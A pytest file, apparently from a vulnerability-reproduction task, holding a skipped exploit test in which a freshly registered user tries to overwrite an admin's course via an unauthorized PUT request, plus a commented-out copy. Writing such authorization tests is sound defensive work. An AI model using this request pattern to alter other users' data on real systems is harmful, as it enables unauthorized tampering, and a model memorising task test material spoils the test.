
import pytest
from helpers import login, register, logout, create_course, add_member, get_user_id

@pytest.mark.skip(reason="Current uploaded PHP code appears to enforce course teacher/admin authorization on course edit and delete; this does not reproduce the provided vulnerability report.")
def test_exploit_any_authenticated_user_can_edit_other_users_course(client, app_instance):
    session, base_url = client
    db_path = app_instance["db_path"]

    assert login(session, base_url, "admin", "admin123").status_code == 200
    course = create_course(session, base_url, "Protected Course", "desc").json()["course"]

    assert register(session, base_url, "other_user", "pass123", "Other User").status_code == 200
    logout(session, base_url)
    assert login(session, base_url, "other_user", "pass123").status_code == 200

    r = session.put(f"{base_url}/api/courses/{course['course_id']}", json={"title": "pwned", "description": "pwned"}, timeout=5)
    assert r.status_code == 200



# from helpers import login, register, logout, create_course
#
#
# def test_exploit_any_authenticated_user_can_edit_other_users_course(client, app_instance):
#     session, base_url = client
#     db_path = app_instance["db_path"]
#
#     assert login(session, base_url, "admin", "admin123").status_code == 200
#     course = create_course(session, base_url, "Protected Course", "desc").json()["course"]
#
#     assert register(session, base_url, "other_user", "pass123", "Other User").status_code == 200
#     logout(session, base_url)
#     assert login(session, base_url, "other_user", "pass123").status_code == 200
#
#     r = session.put(
#         f"{base_url}/api/courses/{course['course_id']}",
#         json={"title": "pwned", "description": "pwned"},
#         timeout=5,
#     )
#     assert r.status_code == 200